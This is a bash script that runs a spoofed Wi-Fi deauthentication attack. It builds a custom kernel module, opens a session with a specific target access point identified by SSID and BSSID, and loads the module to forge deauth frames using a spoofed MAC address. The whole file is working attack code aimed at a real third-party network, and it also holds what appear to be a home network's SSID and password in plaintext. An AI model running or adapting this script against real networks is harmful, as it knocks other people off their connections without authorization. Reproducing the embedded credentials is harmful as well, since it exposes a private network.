#!/bin/bash
# deauth_pe_attack.sh - Spoofed deauth via PE session manipulation
#
# 1. Pre-builds petx4 kernel module
# 2. Creates target AP profile (dummy PSK)
# 3. Connects to target AP (gets PE session on channel 1)
# 4. Loads petx4 module (spoofs selfMacAddr, sends deauth)
# 5. Reconnects to home AP
#
# Usage: sudo bash /tmp/deauth_pe_attack.sh

set -e

TARGET_SSID="不想上班"
TARGET_BSSID="04:67:61:D6:DC:92"
HOME_SSID="9899a5b77"
HOME_PSK="9006609b29404a"

echo "[*] Step 1: Pre-build petx4 module..."
cd /tmp
if [ ! -f petx4.ko ]; then
    as -o petx4.o petx4.S && ld -r -o petx4.ko petx4.o
    echo "    Built petx4.ko"
else
    echo "    petx4.ko already exists"
fi

echo "[*] Step 2: Setup target AP profile..."
# Delete existing profile if any
nmcli connection delete "$TARGET_SSID" 2>/dev/null || true
# Create with dummy PSK
nmcli connection add type wifi con-name "$TARGET_SSID" \
    ssid "$TARGET_SSID" \
    wifi-sec.key-mgmt wpa-psk \
    wifi-sec.psk "dummypassword12345678" \
    802-11-wireless.bssid "$TARGET_BSSID" 2>/dev/null
echo "    Target profile created"

echo "[*] Step 3: Disconnect from home AP..."
nmcli connection down "$HOME_SSID" 2>/dev/null || true
sleep 1

echo "[*] Step 4: Connect to target AP (will fail WPA but creates PE session)..."
# Use timeout since WPA will fail
timeout 3 nmcli connection up "$TARGET_SSID" 2>/dev/null &
NMCLI_PID=$!

# Wait for PE session to be created (after auth+assoc, before WPA timeout)
echo "    Waiting 2s for PE session..."
sleep 2

echo "[*] Step 5: Load petx4 module (spoofed deauth)..."
# Remove old kfind if loaded
rmmod kfind 2>/dev/null || true
insmod /tmp/petx4.ko 2>&1 || true
echo "    Module loaded"

# Wait a moment for TX to complete
sleep 1

echo "[*] Step 6: Check results..."
dmesg | grep -E "petx4|Deauth TX" | tail -15

echo "[*] Step 7: Cleanup and reconnect..."
rmmod kfind 2>/dev/null || true
kill $NMCLI_PID 2>/dev/null || true
nmcli connection delete "$TARGET_SSID" 2>/dev/null || true
sleep 2

echo "[*] Step 8: Reconnect to home AP..."
nmcli connection up "$HOME_SSID" 2>/dev/null || true
sleep 3
echo "[*] Connection status:"
nmcli connection show --active | head -5

echo "[*] Done!"
